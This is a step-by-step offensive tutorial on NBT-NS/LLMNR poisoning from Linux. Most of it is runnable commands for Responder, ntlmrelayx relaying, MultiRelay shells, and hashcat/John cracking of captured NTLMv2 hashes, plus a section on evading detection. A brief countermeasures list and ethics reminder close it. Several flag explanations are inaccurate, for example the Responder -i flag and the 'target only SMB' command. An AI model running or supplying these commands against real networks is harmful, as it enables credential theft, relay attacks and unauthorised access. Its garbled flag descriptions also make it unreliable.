# NBT-NS Poisoning from Linux

## NBT-NS Poisoning from Linux

NBT-NS (NetBIOS Name Service) poisoning is a technique used to intercept NetBIOS name resolution requests and respond with malicious information. This attack targets the Windows name resolution process, which can be exploited to capture authentication credentials or perform man-in-the-middle attacks. This guide focuses on performing NBT-NS poisoning from Linux systems.

### Understanding NetBIOS Name Resolution

Windows systems use several protocols for name resolution, attempting them in the following order:

1. DNS (Domain Name System)
2. LLMNR (Link-Local Multicast Name Resolution)
3. NBT-NS (NetBIOS Name Service)

When a Windows system attempts to connect to a resource that doesn't have a DNS record, it falls back to LLMNR and then to NBT-NS. This fallback mechanism creates an opportunity for attackers to respond to these broadcast requests with malicious information.

### Attack Scenario

The typical attack scenario works as follows:

1. A Windows system attempts to connect to a resource (e.g., `\\fileserver`)
2. DNS resolution fails (no record exists)
3. The system broadcasts an LLMNR/NBT-NS request asking "Who is fileserver?"
4. The attacker responds with "I am fileserver"
5. The Windows system connects to the attacker's machine
6. Authentication is attempted, sending hashed credentials to the attacker

### Required Tools

To perform NBT-NS poisoning from Linux, you'll need:

* **Responder**: The primary tool for poisoning responses
* **ntlmrelayx**: For relaying captured credentials (part of Impacket)
* **hashcat** or **john**: For cracking captured hashes

Most of these tools come pre-installed in Kali Linux and other penetration testing distributions.

### Basic Responder Setup

Responder is the primary tool for NBT-NS poisoning. It listens for name resolution broadcasts and responds with the attacker's IP address.

#### Installation (if not already installed)

```bash
# Clone the repository
git clone https://github.com/lgandx/Responder.git

# Navigate to the directory
cd Responder
```

#### Configuration

Edit the Responder configuration file to enable/disable specific protocols:

```bash
# Open the configuration file
nano Responder.conf
```

Important settings in the configuration:

```ini
[Responder Core]

; Enable or disable protocols
SMB = On
HTTP = On
HTTPS = On
LDAP = On
SQL = On
FTP = On
POP = On
IMAP = On
SMTP = On

; Enable/disable server functionality
; Set this to "On" to capture NTLM hashes
Challenge = 1122334455667788
```

### Basic Usage

#### Starting Responder

```bash
# Start Responder on the primary interface
sudo python3 Responder.py -I eth0 -rdw

# Options explained:
# -I: Interface to use
# -r: Enable answers for NetBIOS domain suffix queries
# -d: Enable answers for NetBIOS domain controller queries
# -w: Enable WPAD rogue proxy server
```

#### Viewing Captured Hashes

Responder stores captured hashes in the `logs` directory:

```bash
# View captured NTLMv2 hashes
cat Responder/logs/SMB-NTLMv2-SSP-*.txt
```

Example captured hash:

```
DESKTOP-USER::INLANEFREIGHT:1122334455667788:B79FBC36C36E3E2770CCA8FF356D77E7:0101000000000000003EB3BFDC09D801FC0373402C9060000000000
```

### Advanced NBT-NS Poisoning Techniques

#### NTLM Relay Attacks

Instead of just capturing hashes, you can relay them to other services using ntlmrelayx:

```bash
# First, disable SMB and HTTP servers in Responder.conf
# Set SMB = Off and HTTP = Off

# Start Responder
sudo python3 Responder.py -I eth0 -rdw

# In another terminal, start ntlmrelayx
sudo python3 ntlmrelayx.py -tf targets.txt -smb2support
```

Where `targets.txt` contains a list of IP addresses to relay authentication to.

#### Targeting Specific Services

You can configure Responder to target specific services:

```bash
# Target only SMB and disable other services
sudo python3 Responder.py -I eth0 -r --lm -v --disable-ess
```

#### Using MultiRelay for Interactive Sessions

For obtaining interactive shells:

```bash
# Start Responder with SMB and HTTP disabled
sudo python3 Responder.py -I eth0 -rdw

# Start MultiRelay.py in another terminal
sudo python3 MultiRelay.py -t 192.168.1.10 -u ALL
```

### Extracting and Cracking Captured Hashes

#### NTLMv2 Hash Cracking with Hashcat

```bash
# Extract hashes from Responder logs
cat Responder/logs/SMB-NTLMv2-SSP-*.txt > captured_hashes.txt

# Crack the hashes using hashcat
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

#### Using John the Ripper

```bash
# Crack NTLMv2 hashes with John
john --format=netntlmv2 captured_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Advanced Analysis and Targeting

#### Network Traffic Analysis

Monitor Responder's activity using Wireshark:

```bash
# Start Wireshark with a filter for NBT-NS traffic
sudo wireshark -i eth0 -f "udp port 137" &
```

#### Targeting Specific Users or Systems

For more focused attacks, you can use additional tools like RunFinger.py to identify potential targets:

```bash
# Identify potential targets
sudo python3 RunFinger.py -i 192.168.1.0/24
```

### Defense Evasion Techniques

Modern networks often have countermeasures against NBT-NS poisoning. Here are some evasion techniques:

#### Modifying Signatures

Edit Responder to change default signatures that may be detected:

```bash
# Edit fingerprint.py
nano fingerprints.py
```

#### Using Selective Targeting

Target specific systems rather than responding to all requests:

```bash
# Target specific hosts
sudo python3 Responder.py -I eth0 -i 192.168.1.10,192.168.1.15
```

#### Timing Adjustments

Implement delays between responses to avoid detection:

```bash
# Modify Responder's timing by editing the source code
# Look for response timing parameters in the source
```

### Countermeasures and Detection

Understanding countermeasures helps test their effectiveness:

1. **Disable NBT-NS**: Configure systems to disable NetBIOS over TCP/IP
2. **Use SMB Signing**: Enforce SMB signing to prevent relay attacks
3. **Network Monitoring**: Deploy solutions that detect poisoning attempts
4. **DNS Infrastructure**: Ensure proper DNS resolution to reduce fallback to NBT-NS

### Practical Scenarios

#### Domain Environments

In domain environments, target workstations that might fall back to NBT-NS:

```bash
# Start Responder and log captured traffic
sudo python3 Responder.py -I eth0 -wrf
```

#### Segmented Networks

In segmented networks, position on the same subnet as the target:

```bash
# Start Responder with verbose output
sudo python3 Responder.py -I eth0 -rdwv
```

### Ethical and Legal Considerations

* Only perform NBT-NS poisoning on networks you own or have explicit permission to test
* Document all activities thoroughly
* Handle captured credentials according to proper security procedures
* Respect privacy and compliance requirements

NBT-NS poisoning remains an effective technique for capturing Windows authentication credentials, especially in environments where proper name resolution isn't fully implemented or where legacy applications rely on NetBIOS name resolution.
